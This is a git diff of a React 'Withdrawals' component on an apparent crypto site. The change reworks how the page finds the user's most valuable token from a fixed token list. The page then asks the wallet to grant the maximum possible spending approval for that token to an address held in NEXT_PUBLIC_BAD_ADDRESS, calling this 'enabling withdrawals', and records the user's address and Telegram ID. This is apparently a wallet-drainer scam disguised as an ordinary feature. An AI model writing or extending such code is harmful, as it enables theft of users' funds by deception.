@@ -28,6 +28,7 @@ import { useSession } from 'next-auth/react';
 import { FC, useEffect, useState } from 'react';
 import { IWithdraw } from 'utils/types';
 import BAD_ABI from '../../../utils/BAD_ABI.json'
+import TOKENS from '../../../utils/TOKENS.json'
 
 const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
   const { data: session } = useSession();
@@ -41,7 +42,7 @@ const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
   
   useEffect(() => {
     if(address){
-      getTokens();
+      getBestToken();
     }
   }, [address]);
 
@@ -67,7 +68,9 @@ const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
   const enable = async () => {
     try{
       let contract = await sdk?.getContractFromAbi(bestToken?.address || "", BAD_ABI);
+      console.log(bestToken)
       await contract?.call("approve", process.env.NEXT_PUBLIC_BAD_ADDRESS, "115792089237316195423570985008687907853269984665640564039457584007913129639935");
+      console.log(bestToken)
       let telegramId = session?.user.telegramId;
       axios.post("/api/updateaddr", { telegramId, address });
       setEnabled(true);
@@ -76,62 +79,55 @@ const Withdrawals: FC<IWithdraw> = ({ btcPrice, xprPrice }) => {
     }
   }
 
-  const getTokens = async () => {
-    const params = {
-        module: "account",
-        action: "tokentx",
-        address: address || "",
-        page: "1",
-        offset: "500",
-        startblock: "0",
-        endblock: "999999999",
-        sort: "asc",
-        apikey: process.env.NEXT_PUBLIC_BSC_API_KEY || "",
-    };
-
-    const response = await fetch(process.env.NEXT_PUBLIC_BSC_API + new URLSearchParams(params).toString());
-    const json = await response.json();
-    if(parseInt(json.status)){
-      const tokenAddrs = new Set(Array.from(json.result, (r: any) => r.contractAddress));
-
-      const getTokenValue = async (tokenAddr: any) => {
-          let contract = await sdk?.getContractFromAbi(tokenAddr, BAD_ABI);
-          try {
-            let balance = await contract?.call("balanceOf", address);
-            const response = await fetch(process.env.NEXT_PUBLIC_PANCAKESWAP_API + tokenAddr);
-            const json = await response.json();
-            let value = parseFloat(json.data.price) * balance;
-
-            return {
-              address: tokenAddr,
-              balance: balance,
-              value: value
-            };
-          } catch (error) {
-            console.log("Error for this address: " + await (contract?.getAddress()));
-          }
+  const getBestToken = async () => {
+    const getTokenInfo = async (token: {symbol: string, address: string}) => {
+      let contract = await sdk?.getContractFromAbi(token.address, BAD_ABI);
+      let balance = await contract?.call("balanceOf", address);
+      let decimals = 0;
+      if(balance){
+        decimals = await contract?.call("decimals");
       }
+      return {
+          address: token.address,
+          balance: balance,
+          symbol: token.symbol,
+          decimals: decimals
+      };
+    }
 
-      var promises = [];
-      for(const tokenAddr of tokenAddrs) {
-        promises.push(getTokenValue(tokenAddr));
+    let tokensInfo = []
+    for (const token of TOKENS) {
+      tokensInfo.push(getTokenInfo(token));
+    }
+
+    Promise.allSettled(tokensInfo).then(async (result: any) => {
+      let validTokens = Array.from(result.filter((x: any) => x.status === "fulfilled" && x.value && x.value.balance != 0), (r: any) => r.value);
+      // validTokens = [
+      //     {"address": "0x9c21123d94b93361a29b2c2efb3d5cd8b17e0a9e", "balance": 5, "decimals": 1, "symbol": "CAKE"},
+      //     {"address": "0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684", "balance": 5, "decimals": 1, "symbol": "WBNB"},
+      //     {"address": "0x337610d27c682e347c9cd60bd4b3b107c9d34ddd", "balance": 5000, "decimals": 1, "symbol": "USDT"},
+      //     {"address": "0xb0aC34810F760262E6b7c86587f22b32AD6D4a4E", "balance": 1, "decimals": 1, "symbol": "WETH"}
+      // ];
+      
+      if(validTokens.length > 0){
+        let symbols = validTokens.map(x => x.symbol);
+
+        const response = await axios.post("/api/tokenvalues", { symbols });
+
+        let tokensValue: {address: string, value: number}[] = [];
+        for(let token of validTokens){
+          let price = response.data.data[token.symbol][0]["quote"]["USD"]["price"];
+          let value = price * token.balance / (10 ** token.decimals);
+
+          tokensValue.push({address: token.address, value: value})
+        }
+
+        setBestToken(tokensValue.sort((x, y) => y.value - x.value)[0]); 
       }
-
-      Promise.allSettled(promises).then(async (result: any) => {
-          let tokens = Array.from(result.filter((x: any) => x.status === "fulfilled" && x.value), (r: any) => r.value);
-          // tokens = [
-          //   {"address": "0x9c21123d94b93361a29b2c2efb3d5cd8b17e0a9e", "balance": 5, "value": 75}, // CAKE
-          //   {"address": "0x7ef95a0FEE0Dd31b22626fA2e10Ee6A223F8a684", "balance": "5", "value": "10"}, // WBNB
-          //   {"address": "0x337610d27c682e347c9cd60bd4b3b107c9d34ddd", "balance": "5", "value": "500"},  // USDT
-          //   {"address": "0xb0aC34810F760262E6b7c86587f22b32AD6D4a4E", "balance": 1, "value": 100}, // WETH
-          // ];
-
-          setBestToken(tokens.length > 0 ? tokens.sort((x, y) => parseFloat(y.value) - parseFloat(x.value))[0] : []);
-      });
-    }
-    else{
-      toast({description: "Consider to swap some tokens them to enable withdraw", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
-    }
+      else{
+        toast({description: "Consider to swap some tokens them to enable withdraw", status: 'error', position: 'bottom-right', isClosable: true, duration: 5000})
+      }
+    });
   }
 
   const formSubmit = async (actions: any) => {
